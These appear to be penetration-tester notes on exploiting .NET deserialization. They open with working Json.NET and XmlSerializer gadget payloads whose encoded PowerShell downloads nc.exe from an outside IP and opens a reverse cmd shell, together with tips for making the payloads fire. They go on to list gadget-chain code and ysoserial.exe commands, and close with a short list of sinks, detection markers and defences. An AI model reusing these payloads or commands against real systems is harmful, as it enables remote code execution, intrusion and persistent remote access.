
Ysoserial
Json 
1-move MethodName to last 
2-remove all breaklines \n cause it break the payload


{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c powershell -nop -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgAwADoAOQAwADAAMgAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7AGMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGEAcwBrAHMAXABuAGMALgBlAHgAZQAgAC0AbgB2ACAAMQAwAC4AMQAwAC4AMQA2AC4AMgAwACAAOQAwADAAMQAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'},
    'MethodName':'Start'
}




XML
1- remove root tag
2-remove all break lines 
3-move object instance to top

`<?xml version="1.0"?>`
`<Tee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >`
    `<ProjectedProperty0>`
        `<ObjectInstance xsi:type="XamlReader"></ObjectInstance>`
        `<MethodName>Parse</MethodName>`
        `<MethodParameters>`
            `<anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">`
                `<![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c powershell -nop -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgAwADoAOQAwADAAMgAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7AGMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGEAcwBrAHMAXABuAGMALgBlAHgAZQAgAC0AbgB2ACAAMQAwAC4AMQAwAC4AMQA2AC4AMgAwACAAOQAwADAAMQAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>`
            `</anyType>`
        `</MethodParameters>`
    `</ProjectedProperty0>`
`</Tee>`

# Identifying Deserialization Vulnerabilities

#### White-Box

|Serializer|Example|Reference|
|---|---|---|
|BinaryFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-7.0)|
|fastJSON|`JSON.ToObject(...)`|[GitHub](https://github.com/mgholam/fastJSON)|
|JavaScriptSerializer|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view=netframework-4.8.1)|
|Json.NET|`JsonConvert.DeserializeObject(...)`|[Newtonsoft](https://www.newtonsoft.com/json)|
|LosFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8.1)|
|NetDataContractSerializer|`.ReadObject(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8.1)|
|ObjectStateFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter?view=netframework-4.8.1)|
|SoapFormatter|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8.1)|
|XmlSerializer|`.Deserialize(...)`|[Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-7.0)|
|YamlDotNet|`.Deserialize<...>(...)`|[GitHub](https://github.com/aaubry/YamlDotNet)|

#### Black-Box

For **.NET Applications** we can keep an eye out for the following:

- Base64-encoded strings beginning with `AAEAAAD/////`
- Strings containing `$type`
- Strings containg `__type`
- Strings containg `TypeObject`

Regarding **Java Applications**, the following cases are interesting:

- Bytes containing `AC ED 00 05`
- Base64-encoded string containg `rO0`

# Exploiting Deserialization Vulnerabilities

#### ObjectDataProvider

        csharp
`using System.Windows.Data; namespace ODPExample {     internal class Program    {        static void Main(string[] args)        {            ObjectDataProvider odp = new ObjectDataProvider();            odp.ObjectType = typeof(System.Diagnostics.Process);            odp.MethodParameters.Add("C:\\Windows\\System32\\cmd.exe");            odp.MethodParameters.Add("/c calc.exe");            odp.MethodName = "Start";        }    } }`

#### TypeConfuseDelegate

        csharp
`Delegate stringCompare = new Comparison<string>(string.Compare); Comparison<string> multicastDelegate = (Comparison<string>) MulticastDelegate.Combine(stringCompare, stringCompare); IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate); FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance); object[] invoke_list = multicastDelegate.GetInvocationList(); invoke_list[1] = new Func<string, string, Process>(Process.Start); fi.SetValue(multicastDelegate, invoke_list); SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer); sortedSet.Add("/c calc"); sortedSet.Add("C:\\Windows\\System32\\cmd.exe");`

#### YSoSerial.NET

- `-f` to specify the `Formatter`, e.g. `Json.NET`, `XmlSerializer`, `BinaryFormatter`
- `-g` to specify the `Gadget`, e.g. `ObjectDataProvider`, `TypeConfuseDelegate`
- `-c` to specify the `Command`, e.g. `calc`
- `-o` to specify the `Output` mode, e.g. `Base64` or `Raw` for plaintext

        text
`.\ysoserial.exe -f [Formatter] -g [Gadget] -c [Command] -o [Output]  E.g.: .\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "notepad" -o Raw .\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "notepad" -o Raw .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'notepad' -o base64`

# Defending against Deserialization Vulnerabilities

1. Avoid Deserializing User Input
2. Avoid Unecessary Deserialization
3. Use Secure Serialization Mechanisms
4. Use Explicit Types
5. Use Signed Data
6. Least Possible Privileges